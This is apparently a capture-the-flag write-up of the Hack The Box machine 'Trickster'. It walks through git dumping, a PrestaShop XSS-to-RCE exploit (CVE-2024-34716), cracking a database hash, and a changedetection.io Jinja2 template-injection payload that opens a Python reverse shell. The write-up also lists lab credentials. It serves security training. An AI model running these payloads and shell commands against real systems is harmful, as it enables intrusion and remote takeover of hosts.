1,Recon
port scan 
	22/tcp ssh `OpenSSH 8.9p1 Ubuntu 3ubuntu0.10`
	80/tcp http `Apache httpd 2.4.52`

Page check
![](images/Pasted%20image%20202409220211111.png)
By press the shop button, it would redirect to `http://shop.trickster.htb`

![](images/Pasted%20image%2020240922021800.png)

Then we can find the login page.
![](images/Pasted%20image%2020240922022017.png)
In this place, we did not have the valid credit, so we can try to create a account and check the `[PrestaShop™]` version.
And we have found the admin account email
```
Store information

Trickster Store  
United States  
Email us: [admin@trickster.htb](mailto:admin@trickster.htb)
```
But when we login successfully there is still nothing useful for us.
Then I want to try some existed vulnerability from exploit-db 
`Prestashop 1.7.7.0 - 'id_product' Time Based Blind SQL Injection`
But it seems not be our target.

Then I would want to check the other web-content.
```
ffuf -u http://shop.trickster.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 403

.git/HEAD               [Status: 200, Size: 28, Words: 2, Lines: 2, Duration: 32ms]
```
Then I found the `.git` and we can use `git-dumper`to download to local machine
`git-dumper http://shop.trickster.htb/.git/ ./git-repo-dump`
Then we can check this git repository:
![](images/Pasted%20image%2020240922024524.png)
The directory `admin634ewutrx1jgitlooaj` looks interesting.
Then let's check it from browser
`http://shop.trickster.htb/admin634ewutrx1jgitlooaj/`
![](images/Pasted%20image%2020240922024721.png)
We get the version `PrestaShop 8.1.5` and let's check its vulners.
```
CVE-2024-34716 – The Deceptive PNG Trap: Breaking Down the PNG-Driven Chain from XSS to Remote Code Execution on PrestaShop (<=8.1.5)
https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/
```
`https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`

When we get the totally shit poc, we need to change it by ourselves.
Then we can run it  and open the `http.server`
```
python3 -m http.server 80

python3 exploit.py
[?] Please enter the URL (e.g., http://prestashop:8000): http://shop.trickster.htb
[?] Please enter your email: wither@trickster.htb
[?] Please enter your message: hello
[?] Please provide the path to your HTML file: ./exploit.html
[X] Yay! Your exploit was sent successfully!
[X] Once a CS agent clicks on attachement, you'll get a SHELL
```
Then we can get the shell as www-data:
```
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.34] 52956
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 08:18:29 up  2:46,  1 user,  load average: 0.10, 0.11, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
james    pts/0    10.10.16.15      07:41    3:41   0.07s  0.07s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

we can make a stable shell by python
```
upgrade to PTY
python3 -c 'import pty;pty.spawn("bash")'
^Z
stty raw -echo; fg
```

When we get the shell, we need to enumerate the files and switch to the valid user shell
There is a config file with valid credit
```
/var/www/prestashop/app/config/parameters.php

'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
```

The  connect to mysql
```
use prestashop
select * from ps_employee;
james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
```

crack james hash => password:`alwaysandforever`
Then we can use ssh to login james shell.

3,shell as root
Fristly we would be like check `sudo -l`
`Sorry, user james may not run sudo on trickster.`

Then we would continue check the `ifconfig` and `netstat`
```
ifconfig

docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:75:61:fe:5d  txqueuelen 0  (Ethernet)
        RX packets 75763  bytes 6661585 (6.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 326059  bytes 16805840 (16.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.34  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:b9:5d:9a  txqueuelen 1000  (Ethernet)
        RX packets 2183172  bytes 239295902 (239.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1479464  bytes 410014126 (410.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

netstat -ntlp

tcp 127.0.0.1:39345 
tcp 0.0.0.0:22 ssh
tcp 0.0.0.0:80 http
tcp 127.0.0.1:3306 mysql
```

In this place we found we have `docker ip` but we did not in the docker.So we guess there would be another docker service.But james is not in docker group
`uid=1000(james) gid=1000(james) groups=1000(james)`

So let's just check it by `ping` and `curl`.
```
ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.057 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.051 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.053 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2040ms
rtt min/avg/max/mdev = 0.051/0.053/0.057/0.002 ms

curl 172.17.0.2
curl: (7) Failed to connect to 172.17.0.2 port 80 after 0 ms: Connection refused

```
That means there is another docker container exist but we did not know which port or service.
Let's make a bash script to check which port is open 
```
#!/bin/bash

# IP address
IP="172.17.0.2"

# Start and end port numbers
START_PORT=1
END_PORT=10000

# Loop to check the port range
for PORT in $(seq $START_PORT $END_PORT); do
  # Use curl to check the port
  curl --connect-timeout 1 $IP:$PORT > /dev/null 2>&1
  
  if [ $? -eq 0 ]; then
    echo "Port $PORT is open on $IP."
  fi
done

or just use nmap the 172.17.0.*
```

Then we get the target:
```
curl 172.17.0.2:5000
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=/">/login?next=/</a>. If not, click the link.
```

Let's use ssh to port forwarding
`ssh james@trickster.htb -L 5000:172.17.0.2:5000`
![](images/Pasted%20image%2020240922034210.png)
We have its version `changedetection.io v0.45.20`
Then we can search the exploit-db
`changedetection < 0.45.20 - Remote Code Execution (RCE)`

Of course, we can use james credit to login.

For triggering launch of Root PoC:
1,start a web-server on the machine "python3 -m http.server 8000"
2,On  the changedetect.io site "Add New Change" enter the URL http://172.17.0.1:8000" && "Edit > Watch"
![](images/Pasted%20image%2020240922040829.png)

3,Set the Notification Url to `"get://<attacker-ip>" `&& the Notification Body to the one from the PoC except change your to your IP & Port"

In this place, because of the jinja format, we can get the payload from `HackTricks`

`Body for all notifications ‐ You can use [Jinja2](https://jinja.palletsprojects.com/en/3.0.x/templates/) templating in the notification title, body and URL, and tokens from below.`

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"listen_ip\",listen_port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}{% endif %}{% endfor %}
```

4, Then we just need to open nc to handle it and press the `Send test notification` .
Then get the container shell, check the `.bash_histroy`
```
root@ae5c137aa8ef:~# cat .bash_history
cat .bash_history
apt update
#YouC4ntCatchMe#
apt-get install libcap2-bin
capsh --print
clear
capsh --print
cd changedetectionio/
```
Then we can see the really liked password `#YouC4ntCatchMe#`

Come to james shell, and su root. 
Get the root shell.

